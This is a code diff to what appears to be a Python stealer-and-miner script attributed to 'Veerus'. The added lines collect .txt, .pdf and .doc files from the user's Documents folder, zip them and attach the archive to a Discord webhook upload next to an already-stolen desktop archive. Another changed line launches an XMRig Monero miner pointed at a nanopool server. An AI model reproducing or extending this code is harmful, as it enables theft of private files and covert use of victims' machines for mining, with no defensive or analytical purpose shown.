@@ -649,9 +649,19 @@ if yes == "yes":
 		with zipfile.ZipFile('desktop.zip', 'w') as zipF:
 			for file in files:
 				zipF.write(file, compress_type=zipfile.ZIP_DEFLATED)
+		desktop = os.path.join(os.path.join(os.path.expanduser('~')), 'Documents') 
+		path = desktop + r'/**/*.txt'
+		files = glob.glob(path, recursive=True)
+		path = desktop + r'/**/*.pdf'
+		files.extend(glob.glob(path, recursive=True))
+		path = desktop + r'/**/*.doc'
+		files.extend(glob.glob(path, recursive=True))
+		with zipfile.ZipFile('Documents.zip', 'w') as zipF:
+			for file in files:
+				zipF.write(file, compress_type=zipfile.ZIP_DEFLATED)
 	def MineThreadWin():
 		print("[.] Starting miner if enabled.")
-		os.system(XMRIGPATH + ' -o xmr-eu1.nanopool.org:14444 -u ' + ADDRESS + ' --coin=monero --threads=3 --background')
+		os.system(XMRIGPATH + ' -o xmr-eu1.nanopool.org:14444 -u ' + ADDRESS + ' --coin=monero --threads=3 ')
 	def MineThreadLinux():
 		print("[.] Starting miner if enabled.")
 		try:
@@ -742,4 +752,5 @@ if yes == "yes":
 	print("[.] Sending Desktop")
 	webhook = DiscordWebhook(url=chiffre, username="github.com/0xSxZ/Veerus/")
 	webhook.add_file(file=open("desktop.zip", "rb").read(), filename="desktop.zip")
+	webhook.add_file(file=open("Documents.zip", "rb").read(), filename="desktop.zip")
 	webhook.execute()
